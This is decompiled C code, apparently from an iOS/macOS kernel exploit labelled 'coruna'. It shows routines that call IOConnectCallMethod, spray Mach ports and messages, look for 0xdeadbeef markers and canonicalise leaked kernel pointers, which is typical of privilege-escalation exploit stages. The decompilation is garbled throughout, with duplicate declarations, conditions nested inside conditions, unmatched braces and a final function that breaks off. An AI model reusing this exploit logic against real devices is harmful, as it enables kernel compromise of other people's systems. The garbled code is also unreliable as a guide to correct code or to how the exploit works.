  if ((handle != 0) && (u = coruna_kernel29bb0_via_ioconnectcallmethod(val,handle,&scratch), (int)u != 0)) {
    if (scratch >> 0x1c == 0) {
      size = 0x4000000;
      if (flags == 0) {
        size = 0;
      }
      if (((scratch & 0xfbffffff | size) == scratch) ||
         (u = coruna_kernel29bb0_trampoline_0001a360(val,handle), (int)u != 0)) {
        u = 1;
      }
    }
    else {
      u = 0;
    }
  }
  return u;
}





unsigned long coruna_mach_port_allocate_27d1c(long arg)

{
  uint8_t *ptr;
  uint tag;
  int status;
  uint64_t *data;
  int *j;
  uint *buf;
  uint64_t type_id;
  long serial;
  unsigned long type_id_8;
  uint64_t tmp_buf;
  
  tmp_buf = 0;
  data = _calloc(0x60,1);
  if (data == (uint64_t *)0x0) {
    return 0xad009;
  }
  data[1] = k_kernel_rodata_word_2af70;
  *(uint32_t *)(data + 2) = 0x44;
  *(uint8_t *)((long)data + 0x14) = 1;
  ptr = k_kernel_mach_task_self_slot;
  tag = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,data + 4,0x480,1);
  if (tag == 0) {
    data[5] = (unsigned long)*(uint *)(data + 1);
    status = _mlock(data[4]);
    if (status != 0) {
load_ok_26:
      j = ___error();
      status = *j;
      buf = (uint *)___error();
      tag = -*buf;
      if (-1 < status) {
        tag = *buf;
      }
      type_id_8 = (unsigned long)(tag | 0x40000000);
      coruna_mach_port_destroy_28364(arg,data);
      return type_id_8;
    }
    tag = _vm_allocate(*(vm_map_t *)ptr,data + 8,(unsigned long)*(uint *)(data + 1),1);
    if (tag == 0) {
      data[9] = (unsigned long)*(uint *)(data + 1);
      status = _mlock(data[8]);
      j = ___error();
      status = *j;
      buf = (uint *)___error();
      tag = -*buf;
      if (-1 < status) {
      tag = *buf;
      }
      type_id_8 = (unsigned long)(tag | 0x40000000);
      coruna_mach_port_destroy_28364(arg,data);
      return type_id_8;
    }
  }
  type_id_8 = (unsigned long)(tag | 0x80000000);
load_ok_27:
  coruna_mach_port_destroy_28364(arg,data);
  return type_id_8;
}





uint64_t coruna_call_mach_port_destroy_28364(long handle)
{
  if (*(long *)(handle + 0x1d8) != 0) {
    coruna_mach_port_destroy_28364(handle);
    *(uint64_t *)(handle + 0x1d8) = 0;
  }
  *(uint64_t *)(handle + 0x1c0) = 0;
  *(uint64_t *)(handle + 0x1b8) = 0;
  *(uint64_t *)(handle + 0x1d0) = 0;
  *(uint64_t *)(handle + 0x1c8) = 0;
  return 0;
}





void coruna_call_mach_msg_27d70(uint64_t val,uint64_t id_2)
{
  coruna_mach_msg_28454(val,id_2,0,0);
  return;
}





void coruna_call_mach_msg_27d70_278f4(uint64_t val,uint64_t id_2)
{
  coruna_mach_msg_28454(val,0,id_2,0);
  return;
}





void coruna_mach_msg_27f94(uint64_t val,uint64_t id_2,uint *size,uint flags_2,int *flags,
                 uint count_3)
{
  mach_msg_size_t rcv_size;
  uint send_size;
  void (*ptr)(void);
  uint u;
  int err;
  int status;
  long handle;
  uint64_t size;
  int flags;
  unsigned long version;
  uint port;
  long addr;
  uint tag;
  unsigned long unaff_x30;
  uint8_t type_id[12];
  uint scratch;
  mach_msg_header_t scratch [2];
  int bootargs [4081];
  long thread_attr;
  
  type_id = (*(void (*)k_kernel_chkstk_darwin_slot)();
  handle = type_id;
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  u = 0xad001;
  if (type_id - 1U < 9) {
    switch(type_id) {
    default:
      if ((3 < flags_2) && (7 < count_3)) {
        u = *size;
        tag = 0;
fail:
        size = 0;
done:
        size = coruna_mach_msg_28454(handle,u,tag,size);
        u = 0;
        *(uint64_t *)flags = size;
      }
      break;
    }
  }
check_ok:
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
    return;
  }
cleanup:
  ___stack_chk_fail(u);
code_r0x00028298:
  version = version + 1;
  if (scratch == version) goto code_r0x00028244;
  goto code_r0x00028288;
}





void coruna_mach_port_destroy_28364(uint64_t val,long *handle)
{
  void (*ptr)(void);
  vm_address_t lv2;
  unsigned long unaff_x30;
  
  if (*handle != 0) {
    coruna_mach_port_mod_refs();
    *handle = 0;
  }
  lv2 = handle[4];
  if ((lv2 != 0) && (handle[5] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,lv2,handle[5]);
    handle[4] = 0;
    handle[5] = 0;
  }
  lv2 = handle[6];
  if ((lv2 != 0) && (handle[7] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,lv2,handle[7]);
    handle[6] = 0;
    handle[7] = 0;
  }
  lv2 = handle[8];
  if ((lv2 != 0) && (handle[9] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,lv2,handle[9]);
    handle[8] = 0;
    handle[9] = 0;
  }
  if (1 < *(mach_port_name_t *)(handle + 10) + 1) {
    _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,
                       *(mach_port_name_t *)(handle + 10));
    *(uint32_t *)(handle + 10) = 0;
  }
  handle[9] = 0;
  handle[8] = 0;
  handle[0xb] = 0;
  handle[10] = 0;
  handle[5] = 0;
  handle[4] = 0;
  handle[7] = 0;
  handle[6] = 0;
  handle[1] = 0;
  *handle = 0;
  handle[3] = 0;
  handle[2] = 0;
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  _free(handle);
  return;
}
unsigned long coruna_mach_msg_28454(long arg,uint32_t val,uint n,int m)

{
  uint rcv_size;
  int j;
  int err;
  mach_port_name_t rcv_name;
  uint u;
  bool idx;
  unsigned long kind;
  unsigned long type_id_16;
  uint64_t type_id;
  uint64_t version;
  uint64_t type_id_8;
  uint64_t type_id_9;
  uint64_t type_id_10;
  uint64_t type_id_15;
  uint64_t type_id_11;
  uint64_t type_id_12;
  uint64_t type_id_17;
  uint64_t type_id_13;
  uint64_t type_id_14;
  uint64_t type_id_18;
  uint type_id_19;
  int ret;
  int n;
  int fd;
  mach_msg_return_t lm23;
  int fd_11;
  unsigned long type_id_20;
  mach_msg_size_t send_size;
  uint32_t type_id_21;
  long serial_13;
  unsigned long type_id_22;
  unsigned long type_id_23;
  long serial_14;
  long serial_15;
  unsigned long type_id_24;
  mach_msg_header_t *msg;
  unsigned long type_id_25;
  uint64_t *obj;
  int fd_12;
  uint8_t cache_41[24];
  uint8_t cache_42[8];
  uint64_t json_buf;
  uint cache_43 [165];
  long cache_44;
  uint cache_45;
  uint cache_22;
  long cache_23;
  
  cache_23 = *(long *)k_kernel_stack_chk_guard_slot;
  obj = *(uint64_t **)(arg + 0x1d8);
  if (obj != (uint64_t *)0x0) {
    rcv_size = *(uint *)(obj + 1);
    j = *(int *)((long)obj + 0xc);
    err = *(int *)(obj + 2);
    fd_12 = 0;
    idx = false;
    if (n != 0) {
      if (*(char *)((long)obj + 0x14) == '\0') {
        type_id_25 = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_23) {
        return type_id_25;
        }
        ___stack_chk_fail();
      }
      else {
        type_id_25 = 0;
        type_id_19 = *(int *)(arg + 0x180) << 1;
        if (0xffff < type_id_19) {
          type_id_19 = 0x10000;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == cache_23) {
        return type_id_25;
        }
        ___stack_chk_fail();
      }
      type_id_19 = coruna_iosurface_buf_size(arg);
      if (type_id_19 > rcv_size) {
        fd_12 = (uint)(obj[3] == 0) << 2;
        idx = true;
      }
    }
    ret = coruna_ctx_test_flag(arg,0x80);
    if ((ret != 0) || (n = coruna_call_mach_msg_27d70_29680(arg,*obj), n == 0)) {
      if (n == 0) {
        serial_15 = obj[8];
        if (*(uint *)(arg + 0x168) <= rcv_size) {
          type_id_25 = 0;
          do {
            *(uint32_t *)(serial_15 + type_id_25 * 4) = val;
            type_id_25 = type_id_25 + 1;
            type_id_19 = 0;
            if (*(uint *)(arg + 0x168) != 0) {
              type_id_19 = rcv_size / *(uint *)(arg + 0x168);
            }
          } while (type_id_25 < type_id_19);
        }
      }
      else {
        serial_15 = obj[6];
      }
      type_id_18 = k_kernel_rodata_word_0002afd8;
      type_id_13 = k_kernel_rodata_word_2afd0;
      type_id_17 = k_kernel_rodata_word_0002afc8;
      type_id_12 = k_kernel_rodata_word_2afc0;
      type_id_11 = k_kernel_rodata_word_0002afb8;
      type_id_15 = k_kernel_rodata_word_2afb0;
      type_id_10 = k_kernel_rodata_word_0002afa8;
      type_id_9 = k_kernel_rodata_word_2afa0;
      type_id_8 = k_kernel_rodata_word_0002af98;
      type_id = k_kernel_rodata_word_2af90;
      type_id_16 = k_kernel_rodata_word_2af80;
      kind = k_kernel_rodata_word_2af78;
      n = 0;
      type_id_25 = 0;
      rcv_name = *(mach_port_name_t *)(obj + 10);
      msg = (mach_msg_header_t *)obj[4];
      type_id_21 = 0x2140000;
      fd_11 = fd_12;
      if (m == 0) {
        type_id_21 = 0x2130000;
      }
      while( true ) {
        _bzero(msg,(unsigned long)rcv_size);
        msg->msgh_bits = 0x14;
        msg->msgh_size = j + (uint)(n != 0) * 8 + fd_11;
        msg->msgh_reserved = 0;
        msg->msgh_id = 0;
        msg->msgh_remote_port = rcv_name;
        msg->msgh_local_port = 0;
        if ((ret == 0) && (fd = coruna_helper_17c24_294e4(arg,*obj,0), fd != 0)) break;
        type_id_14 = k_kernel_rodata_word_2afd0;
        version = k_kernel_rodata_word_2af90;
        if (n == 0) {
          cache_41 = *(uint32_t *)(obj + 10);
          cache_41 = type_id_16;
          ghidra_stack_1 = type_id_18;
          k_kernel_rodata_word_2afd0 = (mach_port_t)type_id_13;
          k_kernel_rodata_word_0002afd4 = SUB84(type_id_13,4);
          cache_41 = k_kernel_rodata_word_2afd0;
          cache_41 = k_kernel_rodata_word_0002afd4;
          cache_43[0] = 0;
          if (*(uint *)(arg + 0x168) != 0) {
            cache_43[0] = rcv_size / *(uint *)(arg + 0x168);
          }
          send_size = 0x2c;
          unique0x100006ae = serial_15;
          json_buf = type_id_21;
        }
        else {
          cache_41 = *(uint32_t *)(obj + 10);
          cache_41 = kind;
          ghidra_stack_1 = type_id_8;
          k_kernel_rodata_word_2af90 = (mach_port_t)type_id;
          k_kernel_rodata_word_0002af94 = SUB84(type_id,4);
          cache_41 = k_kernel_rodata_word_2af90;
          cache_41 = k_kernel_rodata_word_0002af94;
          serial_13 = 0x1c;
          do {
            *(uint64_t *)(cache_42 + serial_13) = type_id_11;
            *(uint64_t *)(cache_41 + serial_13 + 0x10) = type_id_15;
            *(uint64_t *)((long)cache_43 + serial_13) = type_id_10;
            *(uint64_t *)((long)cache_43 + serial_13 + -8) = type_id_9;
            *(uint64_t *)(cache_41 + serial_13 + 8) = type_id_17;
            *(uint64_t *)(cache_41 + serial_13) = type_id_12;
            serial_13 = serial_13 + 0x30;
          } while (serial_13 != 700);
          if (*(char *)((long)obj + 0x14) == '\0') {
            cache_22 = 0;
            if (*(uint *)(arg + 0x168) != 0) {
              cache_22 = n / *(uint *)(arg + 0x168);
            }
            cache_45 = 0x2130000;
          }
          else {
            cache_22 = (n - 0x18) - (uint)(n == *(int *)(arg + 0x180) * 2);
            cache_45 = (cache_45 >> 0x10 & 0xff) << 0x10 | 0x1000000;
          }
          send_size = 0x2e4;
          cache_44 = serial_15;
        }
        k_kernel_rodata_word_2af90 = version;
        k_kernel_rodata_word_2afd0 = type_id_14;
        lm23 = _mach_msg((mach_msg_header_t *)cache_41,0x40003,send_size,0,cache_41,0,0);
        if (((lm23 != 0x10004004) ||
            (lm23 = _mach_msg(msg,0x5000003,msg->msgh_size,rcv_size,rcv_name,0,0), lm23 != 0))
           || (*(int *)((long)&msg->msgh_size + (unsigned long)msg->msgh_size) != err)) break;
        type_id_19 = *(uint *)((long)&msg[2].msgh_local_port + (unsigned long)msg->msgh_size);
        type_id_22 = (unsigned long)type_id_19;
        if (type_id_19 != 0xdeadbeef && type_id_19 != 0) {
          if (n == 0) {
            type_id_20 = type_id_22 << 0x20;
            if (fd_11 != 0) {
              type_id_20 = type_id_22;
            }
            type_id_25 = type_id_20 | type_id_25;
            if ((int)type_id_25 == 0) {
load_ok_31:
              fd_11 = 4;
            }
            else {
              if (type_id_25 >> 0x20 == 0) goto load_ok_32;
              type_id_25 = coruna_ptr_canonicalize(arg,type_id_25);
              if ((type_id_25 != 0) && (type_id_22 = coruna_return_zero_2b2d0(arg), (int)type_id_22 != 0)) {
                fd_11 = coruna_kernel29478_residual_164(arg,type_id_22,cache_41);
                if (fd_11 == 0) {
                  type_id_20 = 0;
                }
                else {
                  type_id_20 = coruna_helper_10384_289b0(arg);
                  type_id_20 = type_id_20 & 0xffffffff;
                }
                type_id_23 = (unsigned long)*(uint *)(arg + 0x180);
                type_id_24 = 0;
                if (type_id_23 != 0) {
                  type_id_24 = type_id_25 / type_id_23;
                }
                serial_14 = type_id_25 - type_id_24 * type_id_23;
                serial_13 = 0;
                if (serial_14 != 0) {
                  serial_13 = type_id_23 - serial_14;
                }
                type_id_24 = type_id_25;
                do {
                  if (type_id_20 == (type_id_24 & *(unsigned long *)(arg + 0x188))) {
                    if (type_id_25 + (type_id_22 & 0xffffffff) <=
                        if (*(long *)k_kernel_stack_chk_guard_slot == cache_23) {
                        return type_id_25;
                        }
                        ___stack_chk_fail();
                    break;
                  }
                  type_id_24 = type_id_24 - (type_id_22 & 0xffffffff);
                } while ((serial_13 + type_id_25) - (cache_41 & 0xffffffff) <= type_id_24);
              }
load_ok_33:
              type_id_25 = 0;
              fd_11 = fd_12;
            }
          }
          else {
            if (fd_11 != 0) {
              type_id_22 = type_id_22 << 0x20;
            }
            type_id_25 = type_id_22 | type_id_25;
            if (!(bool)(idx ^ 1) && type_id_25 >> 0x20 == 0) {
              type_id_25 = obj[3] | type_id_25;
            }
            if ((int)type_id_25 == 0) {
load_ok_32:
              fd_11 = 0;
            }
            else {
              if (type_id_25 >> 0x20 == 0) goto load_ok_31;
              type_id_25 = coruna_ptr_canonicalize(arg,type_id_25);
              fd_11 = fd_12;
              if (type_id_25 != 0) {
                type_id_22 = 0;
                type_id_19 = 0;
                do {
                  u = 1 << (unsigned long)(type_id_19 & 0x1f);
                  if (((u & n) != 0) ||
                     ((*(unsigned long *)(arg + 0x188) & (unsigned long)u) == 0)) {
                    if (type_id_22 == 0) goto load_ok_33;
                    break;
                  }
                  type_id_22 = type_id_22 | u;
                  type_id_19 = type_id_19 + 1;
                } while (type_id_19 != 0x20);
                if ((type_id_22 & type_id_25) != 0) goto load_ok_33;
                if ((idx) && (obj[3] == 0)) {
                  obj[3] = type_id_25 & 0xffffffff00000000;
                }
                if (*(long *)k_kernel_stack_chk_guard_slot == cache_23) {
                return type_id_25;
                }
                ___stack_chk_fail();
              }
            }
          }
        }
        n = n + 1;
        if (n == 10) break;
      }
    }
  }
load_ok_29:
  type_id_25 = 0;
load_ok_30:
  if (*(long *)k_kernel_stack_chk_guard_slot == cache_23) {
    return type_id_25;
  }
  ___stack_chk_fail();
}





uint64_t coruna_helper_10384_289b0(void)
{
  return 0;
}





uint64_t coruna_kernel29478_residual_164(long handle,uint size,uint *flags_2)
{
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  uint kind;
  
  u = *(uint *)(handle + 0x180);
  size = 0;
  if (u != 0) {
    size = size / u;
  }
  kind = size;
  if (size != size * u) {
    kind = u;
    for (size = u << 1; size < 0x8001; size = size + u) {
      version = 0;
      if (size != 0) {
        version = size / size;
      }
      port = 0;
      if (size != 0) {
        port = ((size - version * size) * 100) / size;
      }
      version = 0;
      if (size != 0) {
        version = kind / size;
      }
      tag = 0;
      if (kind != 0) {
        tag = ((kind - version * size) * 100) / kind;
      }
      version = size;
      if (tag <= port) {
        version = kind;
      }
      kind = version;
    }
  }
  if (flags_2 != (uint *)0x0) {
    *flags_2 = kind;
  }
  return 1;
}





unsigned long coruna_kernel29bb0_residual_168(long arg,unsigned long val)

{
  uint port;
  uint tag;
  uint u;
  uint size;
  uint kind;
  uint type_id_16;
  unsigned long type_id;
  uint version;
  
  type_id_16 = (uint)val;
  port = *(uint *)(arg + 0x180);
  type_id = (unsigned long)port;
  version = 0;
  if (port != 0) {
    version = type_id_16 / port;
  }
  if (type_id_16 == version * port) {
    return val;
  }
  version = port << 1;
  if (0x8000 < version) {
    return type_id;
  }
  do {
    tag = 0;
    if (type_id_16 != 0) {
      tag = version / type_id_16;
    }
    u = 0;
    if (version != 0) {
      u = ((version - tag * type_id_16) * 100) / version;
    }
    tag = 0;
    kind = (uint)type_id;
    if (type_id_16 != 0) {
      tag = kind / type_id_16;
    }
    size = 0;
    if (kind != 0) {
      size = ((kind - tag * type_id_16) * 100) / kind;
    }
    tag = version;
    if (size <= u) {
      tag = kind;
    }
    type_id = (unsigned long)tag;
    version = version + port;
  } while (version < 0x8001);
  return type_id;
}





uint coruna_iosurface_buf_size(long handle)
{
  uint u;
  
  u = *(int *)(handle + 0x180) << 2;
  if (u < 0x4001) {
    u = 0x4000;
  }
  return u >> 1 | 1;
}
uint64_t coruna_kernel29478_via_u64_pack(long handle,uint64_t *val,uint *size)
{
  int err;
  uint64_t u;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  uint64_t tag;
  uint64_t kind;
  bool err;
  uint64_t type_id;
  int status;
  
  version = k_kernel_rodata_word_0002aff8;
  size = k_kernel_rodata_word_2aff0;
  u = k_kernel_rodata_word_2afe0;
  err = *(int *)(handle + 0x140);
  type_id = 0xffffffff;
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  if (err || err == status) {
    if (val != (uint64_t *)0x0) {
      if (*size < 0x1b) {
        return 0xffffffff;
      }
      val[1] = k_kernel_rodata_word_0002afe8;
      *val = u;
      val[3] = version;
      val[2] = size;
      port = k_kernel_rodata_word_0002b018;
      type_id = k_kernel_rodata_word_2b010;
      version = k_kernel_rodata_word_0002b008;
      size = k_kernel_rodata_word_2b000;
      u = coruna_u64_pack((k_kernel_rodata_word_0002b040), (k_kernel_rodata_word_2b03c));
      *(uint64_t *)((long)val + 100) = k_kernel_rodata_word_0002b044;
      *(uint64_t *)((long)val + 0x5c) = u;
      kind = k_kernel_rodata_word_2b030;
      tag = k_kernel_rodata_word_2b020;
      u = coruna_u64_pack((k_kernel_rodata_word_2b03c), (k_kernel_rodata_word_0002b038));
      val[9] = k_kernel_rodata_word_0002b028;
      val[8] = tag;
      val[0xb] = u;
      val[10] = kind;
      val[5] = version;
      val[4] = size;
      val[7] = port;
      val[6] = type_id;
    }
    type_id = 0;
    *size = 0x1b;
  }
  return type_id;
}





uint coruna_call_helper_282d0(uint64_t val,uint size,uint *flags_2)
{
  uint u;
  
  coruna_kernel29478_residual_164();
  u = 0;
  if (size != 0) {
    u = *flags_2 / size;
  }
  return u;
}





unsigned long coruna_kernel29bb0_residual_169(long arg,unsigned long val,uint n,uint m)

{
  unsigned long port;
  unsigned long tag;
  long serial_11;
  uint size;
  unsigned long kind;
  unsigned long type_id_16;
  long ctx_val;
  
  type_id_16 = (unsigned long)*(uint *)(arg + 0x180);
  if (*(uint *)(arg + 0x180) == m) {
    val = val & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff);
  }
  else {
    size = 0;
    if (n != 0) {
      size = m / n;
    }
    tag = 0;
    if (0x44a < *(unsigned long *)(arg + 0x158) >> 0x2b) {
      tag = (unsigned long)(m - size * n);
    }
    port = val + n;
    kind = 0;
    if (type_id_16 != 0) {
      kind = port / type_id_16;
    }
    ctx_val = port - kind * type_id_16;
    serial_11 = 0;
    if (ctx_val != 0) {
      serial_11 = type_id_16 - ctx_val;
    }
    do {
      if (tag == (*(unsigned long *)(arg + 0x188) & val)) {
        return val;
      }
      val = val - n;
    } while ((port - m) + serial_11 <= val);
    val = 0;
  }
  return val;
}





unsigned long coruna_mach_port_set_attributes(uint arg,uint val,uint n,mach_port_name_t *m)

{
  uint port;
  uint tag;
  uint8_t *block;
  bool idx;
  uint kind;
  void *data;
  unsigned long type_id;
  size_t ls8;
  uint type_id_8;
  uint type_id_9;
  uint64_t cache_23;
  uint64_t block_ctx;
  uint64_t block_ctx;
  integer_t scratch;
  mach_port_name_t cache_24;
  
  block = k_kernel_mach_task_self_slot;
  type_id = 0xad001;
  kind = 0x20000;
  if (val != 8) {
    kind = 0x10000;
  }
  tag = 0;
  if (arg != 0) {
    tag = kind / arg;
  }
  if (1 < tag) {
    cache_24 = 0;
    kind = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&cache_24);
    if (kind == 0) {
      scratch = 0x400;
      kind = _mach_port_set_attributes(*(ipc_space_t *)block,cache_24,1,&scratch,1);
      if (kind == 0) {
        kind = 0;
        if (val != 0) {
          kind = arg / val;
        }
        ls8 = (unsigned long)kind << 2;
        data = _calloc(ls8,1);
        if (data == (void *)0x0) {
          type_id = 0xad009;
        }
        else {
          type_id_8 = 0x1000;
          if (n != 0) {
            type_id_8 = n;
          }
          do {
            port = tag - 1;
            if (type_id_8 <= tag - 1) {
              port = type_id_8;
            }
            cache_23 = 0;
            block_ctx = 0;
            block_ctx = 0;
            coruna_buf_init(&cache_23);
            if (port == 0) {
load_ok_34:
              type_id = coruna_mach_msg(&cache_23,0,cache_24,1);
            }
            else {
              type_id_9 = 1;
              do {
                type_id = coruna_kernel29bb0_via_buf_grow_2(&cache_23,data,(unsigned long)kind);
                if ((int)type_id != 0) break;
                idx = type_id_9 < port;
                type_id_9 = type_id_9 + 1;
              } while (idx);
              if ((int)type_id == 0) goto load_ok_34;
            }
            coruna_free_1bd0c(&cache_23);
          } while (((int)type_id == 0) && (type_id_8 = type_id_8 - port, type_id_8 != 0));
          if ((int)type_id == 0) {
            *m = cache_24;
            _bzero(data,ls8);
            _free(data);
            return type_id;
          }
          _bzero(data,ls8);
          _free(data);
        }
      }
      else {
        type_id = (unsigned long)(kind | 0x80000000);
      }
      _mach_port_mod_refs(*(ipc_space_t *)block,cache_24,1,-1);
    }
    else {
      type_id = (unsigned long)(kind | 0x80000000);
    }
  }
  return type_id;
}





unsigned long coruna_mach_port_set_attributes_28dd0(uint64_t arg,uint val,uint n,mach_port_name_t *m)

{
  uint8_t *ptr;
  bool flags;
  uint u;
  void *obj;
  unsigned long kind;
  uint type_id_16;
  uint64_t block_ctx;
  uint64_t sa_saved;
  uint64_t stack_guard;
  integer_t serial_buf;
  mach_port_name_t bootargs;
  
  ptr = k_kernel_mach_task_self_slot;
  bootargs = 0;
  u = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&bootargs);
  if (u == 0) {
    serial_buf = 0x400;
    u = _mach_port_set_attributes(*(ipc_space_t *)ptr,bootargs,1,&serial_buf,1);
    if (u == 0) {
      obj = _calloc((unsigned long)val,1);
      if (obj == (void *)0x0) {
        kind = 0xad009;
      }
      else {
        u = 0x1000;
        if (n != 0) {
          u = n;
        }
        block_ctx = 0;
        sa_saved = 0;
        stack_guard = 0;
        coruna_buf_init(&block_ctx);
        type_id_16 = 1;
        do {
          kind = coruna_helper_1be68_17f28(&block_ctx,obj,val - 0x18);
          if ((int)kind != 0) break;
          flags = type_id_16 < u;
          type_id_16 = type_id_16 + 1;
        } while (flags);
        if ((int)kind == 0) {
          kind = coruna_mach_msg(&block_ctx,0,bootargs,1);
          coruna_free_1bd0c(&block_ctx);
          if ((int)kind == 0) {
            *m = bootargs;
            _free(obj);
            return kind;
          }
        }
        else {
          coruna_free_1bd0c(&block_ctx);
        }
        _free(obj);
      }
    }
    else {
      kind = (unsigned long)(u | 0x80000000);
    }
    _mach_port_mod_refs(*(ipc_space_t *)ptr,bootargs,1,-1);
  }
  else {
    kind = (unsigned long)(u | 0x80000000);
  }
  return kind;
}





int coruna_mach_port_mod_refs(uint64_t val,uint64_t *id_2)
{
  uint8_t *ptr;
  int err;
  int status;
  mach_port_name_t *lpm4;
  size_t ls5;
  unsigned long u;
  unsigned long size;
  long handle;
  
  err = coruna_free_1bd0c(id_2 + 5);
  status = coruna_free_1bd0c(id_2 + 8);
  ptr = k_kernel_mach_task_self_slot;
  lpm4 = (mach_port_name_t *)id_2[0xb];
  if (lpm4 != (mach_port_name_t *)0x0) {
    if (*(int *)((long)id_2 + 100) == 0) {
      ls5 = 0;
    }
    else {
      _mach_port_mod_refs(*(ipc_space_t *)k_kernel_mach_task_self_slot,*lpm4,1,-1);
      u = (unsigned long)*(uint *)((long)id_2 + 100);
      if (1 < *(uint *)((long)id_2 + 100)) {
        size = 1;
        handle = 0xc;
        do {
          _mach_port_mod_refs(*(ipc_space_t *)ptr,*(mach_port_name_t *)(id_2[0xb] + handle),1,
                              -1);
          size = size + 1;
          u = (unsigned long)*(uint *)((long)id_2 + 100);
          handle = handle + 0xc;
        } while (size < u);
      }
      lpm4 = (mach_port_name_t *)id_2[0xb];
      ls5 = u * 0xc;
    }
    _bzero(lpm4,ls5);
    _free((void *)id_2[0xb]);
  }
  if ((id_2[3] != 0) && (id_2[4] != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,id_2[3],id_2[4]);
  }
  id_2[0xb] = 0;
  id_2[10] = 0;
  id_2[0xd] = 0;
  id_2[0xc] = 0;
  if (err != 0) {
    status = err;
  }
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[9] = 0;
  id_2[8] = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[1] = 0;
  *id_2 = 0;
  _free(id_2);
  return status;
}





uint8_t * coruna_kernel29bb0_via_mach_msg(uint64_t val,long handle,uint size,int flags)
{
  int err;
  uint8_t *ptr;
  uint u;
  uint32_t *buf;
  unsigned long size;
  uint version;
  uint port;
  uint *str;
  
  size = (unsigned long)*(uint *)(handle + 0x60);
  if (*(uint *)(handle + 0x60) < *(uint *)(handle + 100)) {
    version = 0;
    do {
      buf = (uint32_t *)(*(long *)(handle + 0x58) + size * 0xc);
      str = buf + 1;
      port = *str;
      *(int *)(handle + 0x60) = (int)size;
      u = buf[2];
      while (port < u && version < size) {
        ptr = (uint8_t *)coruna_mach_msg(handle + 0x28,0,*buf,1);
        if ((int)ptr != 0) {
          return ptr;
        }
        port = *str + 1;
        *str = port;
        *(int *)(handle + 0xc) = *(int *)(handle + 0xc) + 1;
        if (flags != -1) {
          err = coruna_kernel29bb0_residual_163();
          if (err != flags) {
            return &k_kernel_rodata_word_2803e;
          }
          port = *str;
        }
        version = version + 1;
        u = buf[2];
      }
      port = size;
    } while ((version != size) &&
            (size = size + 1, port = version, size < *(uint *)(handle + 100)));
  }
  else {
    port = 0;
  }
  version = 0;
  if (port != size) {
    version = 0x28028;
  }
  return (uint8_t *)(unsigned long)version;
}





void coruna_call_mach_vm_machine_attribute_29df8_29184(void)
{
  coruna_kernel29bb0_via_mach_msg();
  return;
}





int coruna_kernel29bb0_via_host_priv_statistics_2(long handle,int *flags,uint size,int *count_2,uint flags_2)
{
  bool err;
  void (*ptr)(void);
  uint u;
  bool status;
  int err;
  int status;
  long handle;
  long addr;
  unsigned long size;
  uint version;
  uint port;
  uint *ptr;
  unsigned long tag;
  unsigned long kind;
  uint type_id;
  uint32_t *buf;
  unsigned long type_id_8;
  double ld18;
  int scratch;
  int bootargs;
  uint64_t thread_attr;
  
  thread_attr = 0;
  ptr = coruna_call_syscall;
  if (*(char *)(handle + 10) != '\0') {
    ptr = (void (*)k_kernel_mach_absolute_time_slot;
  }
  if (size == 0) {
    size = flags[4];
  }
  if (count_2 == (int *)0x0) {
    bootargs = 0;
  }
  else if (flags_2 == 0) {
    bootargs = coruna_kernel29bb0_residual_163();
  }
  else {
    bootargs = *count_2;
  }
  type_id_8 = (unsigned long)(uint)flags[0x18];
  size = (unsigned long)(uint)flags[0x19];
  if ((uint)flags[0x18] < (uint)flags[0x19]) {
    scratch = 0;
    port = 0;
    tag = 0;
    type_id = 0;
    do {
      buf = (uint32_t *)(*(long *)(flags + 0x16) + type_id_8 * 0xc);
      ptr = buf + 1;
      u = *ptr;
      flags[0x18] = (int)type_id_8;
      kind = tag;
      version = port;
      if (u < (uint)buf[2] && type_id < size) {
        do {
          handle = (*ptr)();
          err = coruna_mach_msg(flags + 10,0,*buf,1);
          err = false;
          }
          else {
          err = 0;
          err = false;
          }
          check_ok:
          status = bootargs;
          if (count_2 != (int *)0x0) {
          addr = (*ptr)();
          tag = addr - handle;
          *ptr = *ptr + 1;
          flags[3] = flags[3] + 1;
          port = type_id;
          if ((count_2 == (int *)0x0) || (status = coruna_kernel29bb0_residual_163(), bootargs == status)) {
            if (kind == 0) {
done:
              if (tag <= kind) {
                tag = kind;
                port = version;
              }
            }
            else {
              ld18 = (double)tag;
              err = (double)kind * 1.25 <= ld18;
              status = ld18 <= (double)kind * 0.75;
              if (type_id == flags[2] + version) {
                if (!err && !status) {
                  if ((*(char *)((long)flags + 0x69) == '\0') &&
                     (err = coruna_host_priv_statistics(handle,(long)&thread_attr + 4), err != 0)) {
cleanup:
                    err = false;
                    err = 0x28012;
                    status = bootargs;
                    if (count_2 != (int *)0x0) {
                    skip:
                    *count_2 = status;
                    }
                    status = 0x28029;
                    if (err || err != 0) {
                    status = err;
                    }
                    return status;
                  }
                  u = flags[2];
                  if ((u <= type_id && 0xff < type_id) || (err = scratch, u << 2 <= type_id)
                     ) {
                    if ((*(char *)((long)flags + 0x69) == '\0') &&
                       (thread_attr != (int)thread_attr - *flags)) {
                      err = 0;
                    }
                    else if ((1 < u) ||
                            ((err = type_id - u, scratch != 0 &&
                             (err = scratch, 1 < type_id - scratch)))) {
                      err = 0;
                      err = true;
                      status = bootargs;
                      if (count_2 != (int *)0x0) {
                      skip:
